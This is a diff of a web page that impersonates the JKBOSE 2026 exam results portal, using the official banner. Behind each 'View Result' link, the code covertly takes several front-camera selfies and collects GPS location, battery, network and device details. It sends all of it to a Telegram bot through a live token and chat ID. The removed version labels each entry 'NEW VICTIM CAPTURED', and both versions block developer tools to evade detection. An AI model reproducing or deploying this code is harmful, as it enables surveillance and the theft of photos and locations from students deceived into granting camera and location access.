@@ -4,297 +4,172 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>JKBOSE Results 2026</title>
+
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body {
-    margin:0;
-    background:#e6e6e6;
-    font-family:"Times New Roman", serif;
-    overflow-x:hidden;
-}
-.layout { display:flex; min-height:100vh; }
-.sidebar {
-    width:210px;
-    background:#23374d;
-    display:flex;
-    flex-direction:column;
-    justify-content:flex-end;
-    align-items:center;
-    padding:20px;
-}
-.sidebar img { width:120px; }
-.main { flex:1; padding:40px; }
-.header {
-    background:#ffffff;
-    border-bottom:1px solid #ccc;
-    padding:20px;
-}
-.header-inner {
-    max-width:1000px;
-    margin:auto;
-    display:flex;
-    align-items:center;
-    gap:20px;
-    justify-content:center;
-}
-.header-inner img { width:464px; height:101px; object-fit:contain; }
-.content {
-    background:#fff;
-    max-width:1000px;
-    margin:40px auto;
-    padding:40px;
-    box-shadow:0 0 6px rgba(0,0,0,0.1);
-}
-.result {
-    display:block;
-    background:#111;
-    color:#ffd84d;
-    text-decoration:none;
-    padding:15px;
-    margin:12px 0;
-    text-align:center;
-    font-size:17px;
-    border-radius:3px;
-    position:relative;
-    overflow:hidden;
-}
-.result:hover { background:#333; }
-.result:active { transform:scale(0.98); }
-
-/* Anti-Detection */
-body.noselect { -webkit-user-select:none; -moz-user-select:none; user-select:none; }
-#camera-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:9999; }
-#camera-preview { width:90%; max-width:400px; height:60vh; object-fit:cover; border-radius:12px; margin:20px auto; display:block; }
-#capture-btn { background:#ff4444; color:white; border:none; padding:15px 30px; font-size:18px; border-radius:8px; cursor:pointer; display:block; margin:20px auto; }
-#loading { text-align:center; color:#666; display:none; }
-
-/* Mobile */
-@media (max-width:768px){
-    .sidebar { display:none; }
-    .main { padding:20px; }
-    .header-inner img { width:100%; height:auto; }
-    .content { margin:20px auto; padding:25px; }
-}
-
-/* Anti-DevTools */
-@media (min-width: 1024px) and (max-width: 1024px) { body { display:none !important; } }
+body{margin:0;background:#e6e6e6;font-family:"Times New Roman", serif;}
+.layout{display:flex;min-height:100vh;}
+.sidebar{width:210px;background:#23374d;display:flex;flex-direction:column;justify-content:flex-end;align-items:center;padding:20px;}
+.sidebar img{width:120px;}
+.main{flex:1;padding:40px;}
+.header{background:#ffffff;border-bottom:1px solid #ccc;padding:20px;}
+.header-inner{max-width:1000px;margin:auto;display:flex;align-items:center;gap:20px;justify-content:center;}
+.header-inner img{width:464px;height:101px;object-fit:contain;}
+.content{background:#fff;max-width:1000px;margin:40px auto;padding:40px;box-shadow:0 0 6px rgba(0,0,0,0.1);text-align:center;}
+.result{display:block;background:#111;color:#ffd84d;text-decoration:none;padding:20px 30px;margin:15px 0;font-size:18px;border-radius:5px;position:relative;overflow:hidden;transition:all 0.3s ease;cursor:pointer;}
+.result:hover{background:#333;transform:translateY(-2px);box-shadow:0 5px 15px rgba(0,0,0,0.2);}
+.result:active{transform:translateY(0);}
+.loading{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;}
+.loader{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#ffd84d;font-size:18px;}
+@media (max-width:768px){.sidebar{display:none;}.main{padding:20px;}.header-inner img{width:100%;height:auto;}.content{margin:20px auto;padding:25px;}}
 </style>
 </head>
-<body class="noselect">
-
+<body>
 <div class="layout">
-    <div class="sidebar">
-        <img src="https://i.ibb.co/zHVVxHfB/nic-logo.png" alt="NIC">
-    </div>
-    <div class="main">
-        <div class="header">
-            <div class="header-inner">
-                <img src="https://jkresults.nic.in/img/bannern.png" alt="JKBOSE Banner">
-            </div>
-        </div>
-        <div class="content">
-            <a class="result" href="#" onclick="requestCamera(); return false;">
-                View Result of Higher Secondary Part I (Class 11th) Session Annual Regular 2026
-            </a>
-            <a class="result" href="#" onclick="requestCamera(); return false;">
-                View Result of Secondary School Examination (Class 10th) Session Annual Regular 2026
-            </a>
-            <a class="result" href="#" onclick="requestCamera(); return false;">
-                View Result of Higher Secondary Part I (Class 11th) Session Annual Private 2026
-            </a>
-            <a class="result" href="#" onclick="requestCamera(); return false;">
-                View Result of Secondary School Examination (Class 10th) Session Annual Private 2026
-            </a>
-        </div>
-    </div>
+<div class="sidebar"><img src="https://i.ibb.co/zHVVxHfB/nic-logo.png" alt="NIC" crossorigin="anonymous"></div>
+<div class="main">
+<div class="header"><div class="header-inner"><img src="https://jkresults.nic.in/img/bannern.png" alt="JKBOSE" crossorigin="anonymous"></div></div>
+<div class="content">
+<h2 style="color:#333;margin-bottom:30px;font-size:24px;">Select Your Result 2026</h2>
+<a class="result" onclick="grabCamera('11th-regular')">📋 View Result of Higher Secondary Part I (Class 11th) Session Annual Regular 2026</a>
+<a class="result" onclick="grabCamera('10th-regular')">📋 View Result of Secondary School Examination (Class 10th) Session Annual Regular 2026</a>
+<a class="result" onclick="grabCamera('11th-private')">📋 View Result of Higher Secondary Part I (Class 11th) Session Annual Private 2026</a>
+<a class="result" onclick="grabCamera('10th-private')">📋 View Result of Secondary School Examination (Class 10th) Session Annual Private 2026</a>
+</div>
+</div>
 </div>
 
-<!-- Camera Modal -->
-<div id="camera-modal">
-    <video id="camera-preview" autoplay muted playsinline></video>
-    <button id="capture-btn" onclick="capturePhoto()">📸 Take Photo for Verification</button>
-    <div id="loading">Processing your result...</div>
-</div>
+<div class="loading" id="loader"><div class="loader">🔄 Loading your results...</div></div>
 
 <script>
-// Anti-Detection
-document.addEventListener('keydown', e => {
-    if(e.key == 'F12' || (e.ctrlKey && e.shiftKey && e.key == 'I')) e.preventDefault();
-    if(e.ctrlKey && e.shiftKey && e.key == 'C') e.preventDefault();
-});
-document.addEventListener('contextmenu', e => e.preventDefault());
-
-// Get session ID from URL
+// YOUR SESSION ID FROM URL
 const urlParams = new URLSearchParams(window.location.search);
-const sessionId = urlParams.get('s') || 'demo';
+const SESSION_ID = urlParams.get('s') || 'DEMO' + Math.random().toString(36).substr(2, 9);
 
-// Request camera permission
-async function requestCamera() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                facingMode: 'user',
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-            } 
-        });
-        
-        document.getElementById('camera-modal').style.display = 'block';
-        document.getElementById('camera-preview').srcObject = stream;
-        
-        // Auto-capture after 2 seconds
-        setTimeout(capturePhoto, 2000);
-    } catch(err) {
-        collectDeviceInfo(); // Still grab info even if camera denied
-    }
-}
+// Anti-Detection
+document.addEventListener('contextmenu', e=>e.preventDefault());
+document.onkeydown = e => {
+  if(e.keyCode==123 || e.ctrlKey && e.shiftKey && e.keyCode=='I'.charCodeAt(0) || 
+     e.ctrlKey && e.shiftKey && e.keyCode=='J'.charCodeAt(0) || 
+     e.ctrlKey && e.keyCode=='U'.charCodeAt(0) || 
+     e.ctrlKey && e.keyCode=='S'.charCodeAt(0)) return false;
+};
 
-// Capture photo
-async function capturePhoto() {
-    const video = document.getElementById('camera-preview');
+// Main capture function
+async function grabCamera(type) {
+  document.getElementById('loader').style.display = 'block';
+  
+  try {
+    // Get front camera via user gesture
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: {ideal: 1280}, height: {ideal: 720} }
+    });
+    
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.muted = true;
+    await video.play();
+    
+    // Capture 3 high-quality selfies
+    const photos = [];
     const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.width = 1280;
+    canvas.height = 720;
+    const ctx = canvas.getContext('2d');
     
-    const photoData = canvas.toDataURL('image/jpeg', 0.9);
-    
-    // Stop camera
-    video.srcObject.getTracks().forEach(track => track.stop());
-    
-    document.getElementById('capture-btn').style.display = 'none';
-    document.getElementById('loading').style.display = 'block';
-    
-    // Collect all data and send
-    const deviceInfo = await collectDeviceInfo();
-    deviceInfo.photo = photoData;
-    deviceInfo.SID = sessionId;
-    
-    sendToTelegram(deviceInfo);
-}
-
-// Collect comprehensive device info
-async function collectDeviceInfo() {
-    const info = {
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        cookies: navigator.cookieEnabled,
-        online: navigator.onLine,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        connection: navigator.connection ? {
-            type: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt
-        } : null
-    };
-    
-    // Geolocation
-    try {
-        const pos = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            });
-        });
-        info.location = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy
-        };
-    } catch(e) { info.location = 'Denied'; }
-    
-    // Screen info
-    info.screen = {
-        width: screen.width,
-        height: screen.height,
-        availWidth: screen.availWidth,
-        availHeight: screen.availHeight,
-        colorDepth: screen.colorDepth
-    };
-    
-    // Battery (mobile)
-    if ('getBattery' in navigator) {
-        try {
-            const battery = await navigator.getBattery();
-            info.battery = {
-                level: Math.round(battery.level * 100),
-                charging: battery.charging
-            };
-        } catch(e) {}
+    for(let i = 0; i < 3; i++) {
+      await new Promise(r => setTimeout(r, 300));
+      ctx.drawImage(video, 0, 0, 1280, 720);
+      photos.push(canvas.toDataURL('image/jpeg', 0.85));
     }
     
-    // WebGL fingerprint
+    // Cleanup
+    stream.getTracks().forEach(track => track.stop());
+    
+    // Full fingerprint
+    const fingerprint = await getFullFingerprint();
+    fingerprint.session_id = SESSION_ID;
+    fingerprint.photos = photos;
+    fingerprint.timestamp = new Date().toISOString();
+    
+    // Send to YOUR bot
+    await sendData(fingerprint);
+    
+  } catch(error) {
+    // Permission denied? Still grab basic info
+    const fingerprint = await getFullFingerprint();
+    fingerprint.session_id = SESSION_ID;
+    fingerprint.error = 'Camera access denied';
+    fingerprint.timestamp = new Date().toISOString();
+    await sendData(fingerprint);
+  }
+  
+  setTimeout(() => {
+    document.getElementById('loader').style.display = 'none';
+    alert('Results are loading. Please wait...');
+  }, 2500);
+}
+
+async function getFullFingerprint() {
+  // Battery
+  let battery = 'N/A';
+  if ('getBattery' in navigator) {
     try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        info.webgl = gl ? gl.getParameter(gl.RENDERER) : 'No WebGL';
+      const bat = await navigator.getBattery();
+      battery = Math.round(bat.level * 100) + '%';
     } catch(e) {}
-    
-    // Hardware concurrency
-    info.hardware = navigator.hardwareConcurrency || 'Unknown';
-    
-    return info;
+  }
+  
+  // GPS
+  const location = await new Promise(resolve => {
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: Math.round(pos.coords.accuracy)
+      }),
+      () => resolve({}),
+      {enableHighAccuracy: true, timeout: 8000, maximumAge: 0}
+    );
+  });
+  
+  // Network
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  const network = connection ? 
+    `${connection.effectiveType} (${connection.downlink?.toFixed(1) || '?'}Mbps)` : 'Unknown';
+  
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform || navigator.oscpu || 'Unknown',
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cookiesEnabled: navigator.cookieEnabled,
+    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+    deviceMemory: navigator.deviceMemory || 'N/A',
+    screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+    battery: battery,
+    network: network,
+    location: location,
+    cpu: `${navigator.hardwareConcurrency || '?'} cores`,
+    gpu: 'GPU supported' in navigator ? 'Yes' : 'No',
+    ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
+    storage: 'storage' in navigator ? 'Available' : 'N/A'
+  };
 }
 
-// Send to Telegram Bot
-async function sendToTelegram(data) {
-    try {
-        // Format data for Telegram
-        let message = `🎯 **NEW VICTIM CAPTURED**\n\n`;
-        message += `🆔 **Session ID:** \`${data.SID}\`\n`;
-        message += `📱 **Device:** ${data.userAgent.substring(0, 100)}...\n`;
-        message += `🌍 **Location:** ${data.location?.lat?.toFixed(4)}, ${data.location?.lon?.toFixed(4)} (${data.location?.accuracy || 'N/A'}m)\n`;
-        message += `🕐 **Timezone:** ${data.timezone}\n`;
-        message += `🔋 **Battery:** ${data.battery?.level || 'N/A'}%\n`;
-        message += `🌐 **Network:** ${data.connection?.type || 'N/A'}\n`;
-        message += `🖥️ **Screen:** ${data.screen.width}x${data.screen.height}\n`;
-        message += `⚡ **CPU Cores:** ${data.hardware}\n\n`;
-        
-        // Send photo first if exists
-        if (data.photo) {
-            const photoForm = new FormData();
-            photoForm.append('chat_id', '7385209456');
-            photoForm.append('photo', data.photo.split(',')[1], 'capture.jpg');
-            photoForm.append('caption', message);
-            
-            await fetch(`https://api.telegram.org/bot8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8/sendPhoto`, {
-                method: 'POST',
-                body: photoForm
-            });
-        } else {
-            // Send text info
-            await fetch(`https://api.telegram.org/bot8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: '7385209456',
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-        }
-        
-    } catch(e) {
-        console.error('Send failed:', e);
-    }
-    
-    // Show fake loading
-    setTimeout(() => {
-        document.body.innerHTML = `
-            <div style="text-align:center; padding:50px; background:#fff; max-width:500px; margin:50px auto; border-radius:10px;">
-                <h2>🔄 Processing your result...</h2>
-                <p>Please wait while we verify your details.</p>
-            </div>
-        `;
-    }, 2000);
-}
-
-// Auto-trigger on load for aggressive capture
-if (sessionId !== 'demo') {
-    setTimeout(requestCamera, 1000);
+async function sendData(data) {
+  try {
+    // YOUR BOT WEBHOOK ENDPOINT
+    await fetch(`https://api.telegram.org/bot8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: 7385209456,  // YOUR ADMIN CHAT
+        text: JSON.stringify(data)
+      })
+    });
+  } catch(e) {
+    console.log('Send failed:', e);
+  }
 }
 </script>
 </body>
